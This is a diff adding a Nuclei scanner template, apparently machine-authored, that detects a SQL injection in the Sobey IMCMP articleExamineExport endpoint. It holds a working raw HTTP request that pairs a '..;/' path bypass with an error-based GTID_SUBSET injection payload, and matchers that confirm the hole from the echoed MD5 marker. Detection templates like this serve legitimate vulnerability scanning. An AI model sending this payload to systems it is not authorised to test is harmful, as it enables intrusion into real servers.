@@ -1,0 +1,29 @@
+id: sobey-imcmp-articleexamineexport-sqli
+info:
+  name: Sobey IMCMP articleExamineExport SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sqli
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - raw:
+      - |
+        GET /sobey-mchEditor/js/..;/mch/Articlelist/articleExamineExport?siteCode=1&status=1+AND+GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(1944=1944,md5({{t1}})))),0x7e),1944)&token=1&createStartTime=1&endStartTime=10 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "Sobey"
+          - ".articleScorelistExport"
+          - "~{{t2}}~"
+          - "java.sql.SQLException"
